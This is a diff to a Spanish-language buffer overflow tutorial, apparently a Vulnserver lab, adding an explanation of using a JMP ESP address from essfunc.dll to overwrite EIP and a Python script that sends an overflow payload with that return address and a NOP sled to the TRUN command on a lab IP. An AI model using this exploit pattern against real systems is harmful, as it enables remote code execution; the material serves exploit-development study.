@@ -288,6 +288,40 @@ Y lo vamos abuscar con mona
 ```
 !mona find -s "xff\xe4" -m essfunc.dll
 ```
+Este valor que nos da del modulo de que no tiene protecciones (essfunc.dll) es el que vamos a poner en el return address o lo que es lo mismo en el EIP(para este caso osea la sigueinte instrccion).
+
+Aqui me falto este script donde se puede ver que si sobre escribes el EIP.
+
+```python
+
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+
+
+shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"  + b"\x90" * 16
+
+print ("Vamos...1")
+
+while True:
+	try:
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect(('192.168.230.129',9999))
+
+		payload= b"TRUN /.:/" + shellcode
+
+		s.send((payload))
+		s.close()
+		sleep(1)
+		#buffer = buffer + "A" * 100
+	except:
+		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
+		sys.exit()
+
+
+```
 
 ## 6. Creando shellcode
 
